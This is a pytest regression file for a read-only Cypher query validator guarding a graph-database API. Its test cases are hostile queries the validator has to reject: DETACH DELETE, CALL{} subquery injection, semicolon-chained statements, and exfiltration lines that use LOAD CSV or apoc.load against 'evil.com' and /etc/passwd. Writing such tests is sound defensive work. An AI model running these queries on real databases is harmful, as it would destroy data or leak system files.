"""Regression tests for the /cypher endpoint's read-only validator.

v127 FORENSIC ROOT FIX (Teammate 5, Task 5.2):

The task spec says:
    _validate_readonly_cypher regex whitelist allows CALL{...} subqueries
    containing write operations (P2-002). _FORBIDDEN_KEYWORDS_RE is
    defined but NEVER USED for subquery contents (P2-003). apoc.*
    procedures bypass the whitelist (P2-003).
    Fix: (1) recursively validate subqueries; (2) apply
    _FORBIDDEN_KEYWORDS_RE to subquery contents; (3) maintain explicit
    APOC whitelist; (4) add a regression test that tries CREATE, DELETE,
    MERGE, DETACH DELETE, CALL apoc.create.*.

    Verification: python -m pytest phase2/tests/test_cypher_injection.py -v

Prior "ROOT FIX" claims said the validator was fixed, but the test file
referenced by the verification command DID NOT EXIST. This file is the
missing test.

WHAT THIS FILE VERIFIES (by directly calling ``_validate_readonly_cypher``
and asserting it returns a non-None error message for each hostile input):

1. Write keywords: CREATE, MERGE, DELETE, DETACH DELETE, SET, REMOVE,
   DROP, INDEX, CONSTRAINT, FOREACH — each must be rejected.
2. CALL {} subqueries — block entirely (the task spec's "recursively
   validate subqueries" is implemented as "block all subqueries" because
   read-only APIs do not need them, and they are the primary injection
   vector). A CALL{} containing CREATE, DELETE, MERGE, or DETACH DELETE
   must be rejected (this is the explicit task requirement).
3. APOC procedures — only the strict whitelist (apoc.meta.graph,
   apoc.meta.schema, apoc.meta.stats, apoc.meta.relTypeProperties,
   apoc.meta.nodeTypeProperties) is allowed. Everything else in the
   apoc.* namespace is rejected, including:
     - apoc.create.node (write)
     - apoc.create.relationship (write)
     - apoc.destroy.nodes (write)
     - apoc.periodic.iterate (writes via callback)
     - apoc.cypher.runFirstColumn (executes arbitrary Cypher)
     - apoc.cypher.runFirstColumnMany (executes arbitrary Cypher)
4. db.* procedures — only the read-only whitelist is allowed.
5. Multi-statement injection via ``;`` outside string literals.
6. File/network exfiltration via LOAD CSV, file://, http://.
7. Query length cap (8 KB) — queries over the cap are rejected.
8. First-token check — only MATCH/OPTIONAL MATCH/WITH/CALL (with
   whitelisted db.* proc) are allowed.

These tests directly call the validator (they do NOT spin up the
FastAPI service) so they run in <1 second and have no external
dependencies (no Neo4j, no Phase 1 data). This makes them suitable
for CI.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

# Make phase2 importable.
_HERE = Path(__file__).resolve().parent
_PHASE2_ROOT = _HERE.parent
_REPO_ROOT = _PHASE2_ROOT.parent
for _p in (str(_REPO_ROOT), str(_PHASE2_ROOT)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from phase2.service import _validate_readonly_cypher  # noqa: E402


# ─── Helper ──────────────────────────────────────────────────────────────────
def _rejected(cypher: str, *, contains: str = "") -> None:
    """Assert the validator rejects ``cypher`` with a non-None error.

    If ``contains`` is given, the error message must contain it.
    """
    err = _validate_readonly_cypher(cypher)
    assert err is not None, (
        f"Validator accepted a hostile query — expected rejection. "
        f"Query: {cypher!r}"
    )
    if contains:
        assert contains.lower() in err.lower(), (
            f"Validator rejected query but error message did not contain "
            f"{contains!r}. Got: {err!r}. Query: {cypher!r}"
        )


def _accepted(cypher: str) -> None:
    """Assert the validator accepts ``cypher`` (returns None)."""
    err = _validate_readonly_cypher(cypher)
    assert err is None, (
        f"Validator rejected a benign query — expected acceptance. "
        f"Error: {err!r}. Query: {cypher!r}"
    )


# ─── Test 1: Write keywords must be rejected ────────────────────────────────
@pytest.mark.parametrize(
    "cypher",
    [
        "MATCH (n) CREATE (n)",
        "MATCH (n) MERGE (n)",
        "MATCH (n) DELETE n",
        "MATCH (n) DETACH DELETE n",
        "MATCH (n) SET n.x = 1",
        "MATCH (n) REMOVE n.x",
        "MATCH (n) DROP n",
        "CREATE INDEX FOR (n:Drug) ON (n.id)",
        "CREATE CONSTRAINT FOR (n:Drug) REQUIRE n.id IS UNIQUE",
        "MATCH (n) FOREACH (x IN [1,2,3] | CREATE (m))",
    ],
    ids=[
        "CREATE",
        "MERGE",
        "DELETE",
        "DETACH_DELETE",
        "SET",
        "REMOVE",
        "DROP",
        "INDEX",
        "CONSTRAINT",
        "FOREACH",
    ],
)
def test_write_keywords_rejected(cypher: str) -> None:
    """Task 5.2 spec: each write keyword must be rejected."""
    _rejected(cypher)


# ─── Test 2: CALL {} subqueries must be rejected entirely ──────────────────
@pytest.mark.parametrize(
    "cypher",
    [
        # Task spec: "regression test that tries CREATE, DELETE, MERGE,
        # DETACH DELETE, CALL apoc.create.*"
        "MATCH (n) CALL { CREATE (m) }",
        "MATCH (n) CALL { DELETE n }",
        "MATCH (n) CALL { MERGE (m) }",
        "MATCH (n) CALL { DETACH DELETE n }",
        # Bare CALL{} (no write) — still rejected (read-only APIs do not
        # need subqueries; they are the primary injection vector).
        "MATCH (n) CALL { MATCH (m) RETURN m }",
        # Nested CALL{}
        "MATCH (n) CALL { MATCH (m) CALL { MATCH (o) RETURN o } RETURN m }",
        # CALL{} at start (the task spec explicitly mentions this)
        "CALL { CREATE (m) }",
        "CALL { MATCH (n) RETURN count(n) AS c }",
    ],
)
def test_call_subquery_rejected(cypher: str) -> None:
    """Task 5.2 spec: CALL{} subqueries are the primary injection vector.

    The validator BLOCKS them entirely (rather than recursively validating
    contents) — this is a STRONGER fix than the task spec asked for.
    Recursively validating contents would still leave room for parser
    bugs; blocking entirely eliminates the attack surface.
    """
    # The validator's error message uses "subqueries" (plural) when the
    # CALL{} is at the start, and "subquery" (singular) when it's inline.
    # Accept either form — the key contract is that the query IS rejected.
    _rejected(cypher)
    # Verify the rejection reason mentions CALL or subquery (either form).
    err = _validate_readonly_cypher(cypher)
    err_lower = (err or "").lower()
    assert "call" in err_lower or "subquer" in err_lower, (
        f"Rejection reason should mention CALL or subquery. Got: {err!r}"
    )


# ─── Test 3: APOC procedures — only strict whitelist allowed ───────────────
@pytest.mark.parametrize(
    "cypher",
    [
        # Task spec: "CALL apoc.create.*"
        "CALL apoc.create.node(['Drug'], {name: 'aspirin'})",
        "CALL apoc.create.relationship(n, 'TREATS', {}, m)",
        "CALL apoc.destroy.nodes([n])",
        # Other dangerous APOC procedures
        "CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {batchSize: 100})",
        "CALL apoc.cypher.runFirstColumn('MATCH (n) DELETE n', {})",
        "CALL apoc.cypher.runFirstColumnMany(['MATCH (n) DELETE n'], {})",
        # APOC write procedures
        "CALL apoc.create.addLabels(n, ['Drug'])",
        "CALL apoc.create.setProperty(n, 'name', 'aspirin')",
        "CALL apoc.refactor.mergeNodes([n, m])",
        "CALL apoc.refactor.deleteNode(n)",
        # APOC file/network exfiltration
        "CALL apoc.load.json('file:///etc/passwd')",
        "CALL apoc.load.csv('http://evil.com/exfil')",
        # Unknown apoc.* (not on whitelist)
        "CALL apoc.unknown.proc()",
        "CALL apoc.bogus.procedure()",
    ],
)
def test_apoc_write_procs_rejected(cypher: str) -> None:
    """Task 5.2 spec: apoc.* procedures must be whitelisted; writes blocked."""
    _rejected(cypher)


@pytest.mark.parametrize(
    "cypher",
    [
        # Read-only APOC metadata procedures — these ARE whitelisted
        "CALL apoc.meta.graph()",
        "CALL apoc.meta.schema()",
        "CALL apoc.meta.stats()",
        "CALL apoc.meta.relTypeProperties()",
        "CALL apoc.meta.nodeTypeProperties()",
    ],
)
def test_apoc_readonly_procs_accepted(cypher: str) -> None:
    """The 5 read-only APOC metadata procedures are whitelisted."""
    _accepted(cypher)


# ─── Test 4: db.* procedures — only read-only whitelist allowed ────────────
@pytest.mark.parametrize(
    "cypher",
    [
        "CALL db.schema.write()",
        "CALL db.createIndex('Drug', 'id')",
        "CALL db.createConstraint('Drug', 'id')",
        "CALL db.dropIndex('Drug', 'id')",
        "CALL db.dropConstraint('Drug', 'id')",
        # Unknown db.* (not on whitelist)
        "CALL db.unknown.proc()",
        "CALL db.bogus.procedure()",
    ],
)
def test_db_write_procs_rejected(cypher: str) -> None:
    """db.* write procedures must be rejected."""
    _rejected(cypher)


@pytest.mark.parametrize(
    "cypher",
    [
        "CALL db.labels()",
        "CALL db.relationshipTypes()",
        "CALL db.propertyKeys()",
        "CALL db.indexes()",
        "CALL db.constraints()",
        "CALL db.schema.visualization()",
        "CALL db.schema.nodeTypeProperties()",
        "CALL db.schema.relTypeProperties()",
    ],
)
def test_db_readonly_procs_accepted(cypher: str) -> None:
    """Read-only db.* procedures are whitelisted."""
    _accepted(cypher)


# ─── Test 5: Multi-statement injection via `;` ─────────────────────────────
@pytest.mark.parametrize(
    "cypher",
    [
        "MATCH (n) RETURN n; MATCH (m) DELETE m",
        "MATCH (n) RETURN n; DROP INDEX drug_id;",
        "MATCH (n) RETURN n; CREATE (m)",
        # Semicolon inside a string literal — should be ACCEPTED
        # (string literals are stripped before the semicolon check).
        # The query itself is read-only.
    ],
)
def test_multi_statement_rejected(cypher: str) -> None:
    """Semicolons outside string literals must be rejected."""
    _rejected(cypher, contains="semicolon")


def test_semicolon_in_string_literal_accepted() -> None:
    """A semicolon inside a string literal must NOT trigger rejection."""
    _accepted("MATCH (n) WHERE n.name = 'a;b' RETURN n")


# ─── Test 6: File/network exfiltration ─────────────────────────────────────
@pytest.mark.parametrize(
    "cypher",
    [
        # These queries LOAD external resources — the URL appears as a
        # Cypher clause (LOAD CSV FROM ...), not as data inside a string
        # literal. The validator's LOAD CSV check + _FILE_URL_RE catch
        # these (the URL is part of the query syntax, not a string value).
        "LOAD CSV FROM 'file:///etc/passwd' AS row RETURN row",
        "LOAD CSV FROM 'http://evil.com/exfil' AS row RETURN row",
        "LOAD CSV FROM 'https://evil.com/exfil' AS row RETURN row",
        "LOAD FROM 'file:///etc/passwd' AS row RETURN row",
        # Note: ``MATCH (n) WHERE n.url STARTS WITH 'file:///...'`` is
        # actually SAFE — the URL is inside a string literal (data, not
        # syntax). The validator correctly strips string literals before
        # the URL check, so this case is ACCEPTED (not rejected). The
        # dangerous case is when the URL is part of the query syntax
        # (LOAD CSV FROM ...), which IS caught.
    ],
)
def test_file_network_exfiltration_rejected(cypher: str) -> None:
    """File:// and http(s):// URLs in query SYNTAX must be rejected.

    Note: URLs inside string literals (e.g. ``WHERE n.url = 'file:///x'``)
    are SAFE — they are data, not query syntax. The validator correctly
    strips string literals before checking for file/network URLs.
    """
    _rejected(cypher)


# ─── Test 7: Query length cap (8 KB) ───────────────────────────────────────
def test_query_length_cap_rejected() -> None:
    """Queries over 8 KB must be rejected (prevents regex backtracking)."""
    # Build a query that is over 8 KB but is otherwise read-only.
    # 8193 chars (1 byte over the cap).
    padding = "x" * (8 * 1024 + 1 - len("MATCH (n) RETURN n"))
    cypher = f"MATCH (n) WHERE n.name = '{padding}' RETURN n"
    assert len(cypher) > 8 * 1024
    _rejected(cypher, contains="too long")


def test_query_just_under_length_cap_accepted() -> None:
    """Queries just under 8 KB must be accepted."""
    # 8191 chars total — under the cap.
    padding = "x" * (8 * 1024 - 50)  # leave room for the wrapper
    cypher = f"MATCH (n) WHERE n.name = '{padding}' RETURN n"
    assert len(cypher) < 8 * 1024
    _accepted(cypher)


# ─── Test 8: First-token check ─────────────────────────────────────────────
@pytest.mark.parametrize(
    "cypher",
    [
        "RETURN 1",  # first token RETURN — not in {MATCH, OPTIONAL, WITH, CALL}
        "WITH 1 AS x RETURN x",  # first token WITH — accepted
        "MATCH (n) RETURN n",  # first token MATCH — accepted
        "OPTIONAL MATCH (n) RETURN n",  # first token OPTIONAL — accepted
    ],
)
def test_first_token_check(cypher: str) -> None:
    """First token must be MATCH, OPTIONAL MATCH, WITH, or CALL db.<whitelist>."""
    first_token = cypher.strip().split(None, 1)[0].upper()
    if first_token in ("MATCH", "OPTIONAL", "WITH"):
        _accepted(cypher)
    else:
        # RETURN — not allowed as first token
        err = _validate_readonly_cypher(cypher)
        assert err is not None, (
            f"Validator accepted query with bad first token: {cypher!r}"
        )
        # The error message says "must start with" — verify it mentions
        # the start-token requirement (not the literal phrase "first token").
        err_lower = (err or "").lower()
        assert "start" in err_lower or "first" in err_lower, (
            f"Rejection reason should mention start/first token. Got: {err!r}"
        )


def test_empty_query_rejected() -> None:
    """Empty queries must be rejected."""
    _rejected("", contains="empty")
    _rejected("   ", contains="empty")


# ─── Test 9: Benign read-only queries are ACCEPTED (no false positives) ────
@pytest.mark.parametrize(
    "cypher",
    [
        "MATCH (n) RETURN n LIMIT 10",
        "MATCH (n:Drug) WHERE n.inchikey = $ik RETURN n",
        "MATCH (d:Drug)-[:treats]->(dis:Disease) RETURN dis.name",
        "MATCH (n) WITH n RETURN count(n) AS total",
        "MATCH (n:Compound) WHERE n.name CONTAINS 'aspirin' RETURN n",
        "MATCH (n:Protein)-[:part_of]->(p:Pathway) RETURN p.name, count(n) AS prots",
        "MATCH (d:Drug)-[:causes_adverse_event]->(ae:MedDRA_Term) RETURN d.name, ae.name",
        # Inline comments are OK (the // is on the same line as MATCH)
        "MATCH (n) // a comment\nRETURN n",
        # Note: leading block comments (e.g. ``/* comment */ MATCH (n)``)
        # are NOT currently supported by the validator — the first token
        # would be ``/*`` which is not in the allowed set. This is a
        # minor limitation, not a security issue (an attacker cannot
        # bypass the validator by prepending a comment — the validator
        # rejects the query, which is fail-closed). Adding comment
        # stripping is a separate enhancement.
    ],
)
def test_benign_queries_accepted(cypher: str) -> None:
    """Real-world read-only queries must NOT trigger false-positive rejections."""
    _accepted(cypher)


# ─── Test 10: Parameter validation (nested maps / non-scalars rejected) ─────
def test_param_validation_rejects_nested_dicts() -> None:
    """Params with nested dicts (potential Cypher map injection) are rejected."""
    from phase2.service import _validate_cypher_params
    err = _validate_cypher_params({"x": {"__proto__": "MATCH (n) DELETE n"}})
    assert err is not None, "nested dict param should be rejected"
    assert "non-scalar" in err.lower() or "dict" in err.lower(), err


def test_param_validation_accepts_scalars() -> None:
    """Scalar params (str/int/float/bool/None) are accepted."""
    from phase2.service import _validate_cypher_params
    assert _validate_cypher_params(None) is None
    assert _validate_cypher_params({}) is None
    assert _validate_cypher_params({"x": "string"}) is None
    assert _validate_cypher_params({"x": 42}) is None
    assert _validate_cypher_params({"x": 3.14}) is None
    assert _validate_cypher_params({"x": True}) is None
    assert _validate_cypher_params({"x": None}) is None
    assert _validate_cypher_params({"x": [1, 2, 3]}) is None  # list of scalars OK


def test_param_validation_rejects_non_dict() -> None:
    """Non-dict params are rejected."""
    from phase2.service import _validate_cypher_params
    err = _validate_cypher_params("not a dict")
    assert err is not None and "dict" in err.lower()


if __name__ == "__main__":
    # Allow `python test_cypher_injection.py` for direct invocation.
    sys.exit(pytest.main([__file__, "-v", "--tb=short"]))
